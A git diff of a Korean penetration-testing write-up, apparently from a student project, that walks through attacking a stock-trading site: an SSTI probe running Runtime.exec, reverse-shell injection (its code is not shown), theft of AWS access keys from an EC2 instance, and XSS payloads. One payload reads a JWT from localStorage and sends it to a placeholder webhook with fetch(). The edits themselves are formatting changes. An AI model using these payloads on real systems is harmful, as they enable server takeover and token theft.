@@ -60,11 +60,13 @@ sidebar:
 ## S-1 시스템 침투 랜섬웨어 감염 시나리오
 
 ### 특정 페이지에서 SSTI 취약점 유무를 확인
+
 - 검색창에 T(java.lang.Runtime).getRuntime().exec(”id")를 입력해서 Thymleaf 구 버전에서 발생하는 SSTI 취약점이 존재함을 확인한다.
 
 > <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/7625f76d-142d-44e0-8248-2350447edada">
 
 ### SSTI 취약점을 이용해 리버스 쉘 접속 코드를 주입
+
 - 취약점이 존재하는 부분, 즉 커뮤니티 검색창에 리버스 쉘을 작성하는 코드를 작성하여 서버에서 실행시킨다.
 
 ```
@@ -228,7 +230,7 @@ echo "
 
 - EC2 인스턴스에 접근하면, 시스템에서 쉘 권한을 획득합니다. 이를 통해 시스템 내에서 명령어를 실행하고, AWS Command Line Interface(AWS CLI)를 사용하여 AWS 계정에 대한 액세스 키를 탈취한다.
 
-<img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/075c08d3-4073-43e5-988b-b59ae990427b">
+> <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/075c08d3-4073-43e5-988b-b59ae990427b">
 
 > <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/db57f153-a607-4a54-98fa-9036b15b0986">
 
@@ -385,7 +387,7 @@ echo "
 
 | 입력 구문 |
 |---------|
-| <script>alert(‘test’);</script> |
+| "<script>alert('test');</script>" |
 
 > <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/8d473a6c-03bf-4fa5-8445-cc601bde1c49">
 > <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/e6d8147d-bedc-45fe-8aa4-1c1dee666fef">
@@ -395,7 +397,7 @@ echo "
 
 | 입력 구문 |
 |---------|
-| <script>let token = window.localStorage.getItem(“SKJWTToken”); let url = “[webhook site url]” try{token=Android.getToken();}catch{}fetch(url+”?name=SKJWTToken&token=”+token);</script> |
+| "<script>let token = window.localStorage.getItem(“SKJWTToken”); let url = “[webhook site url]” try{token=Android.getToken();}catch{}fetch(url+”?name=SKJWTToken&token=”+token);</script>" |
 
 > <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/8bd89b09-b393-4bda-b2ca-e0419c48f3b3">
 
